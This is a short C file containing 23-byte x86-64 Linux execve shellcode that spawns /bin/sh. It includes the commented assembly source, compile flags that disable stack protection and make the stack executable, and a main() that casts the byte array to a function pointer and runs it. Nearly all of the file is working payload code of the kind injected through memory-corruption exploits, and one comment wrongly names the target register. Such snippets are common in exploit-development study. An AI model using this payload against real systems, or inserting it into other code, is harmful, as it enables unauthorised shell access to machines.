/*
Compile with: gcc -fno-stack-protector -z execstack
23 byte execve shellcode
  2 ; int execve(const char *filename, char *const argv[], char *const envp[]);
  3 BITS 64
  4
  5 section .text
  6         global start
  7
  8 start:
  9         xor rdx, rdx                ;zero out rdx
 10         push rdx                    ;push rdx to stack to null terminate /bin//sh
 11         mov al, 0x3b                ;move 3b into al for execve
 12         mov rcx, 0x68732f2f6e69622f ;move the immediate value /bin//sh in hex in rcx
 13         push rcx                    ;push the immediate value stored in rcx onto the stack
 14         lea rdi, [rsp]              ;load the address of the string that is on the stack into rsi
 15         syscall                     ;make the syscall
*/

char shellcode[] = "\x48\x31\xd2\x52\xb0\x3b\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x48\x8d\x3c\x24\x0f\x05";

int main(int argc, char **argv)
{
    int (*func)();
    func = (int (*)()) shellcode;
    (int)(*func)();
     return 0;
}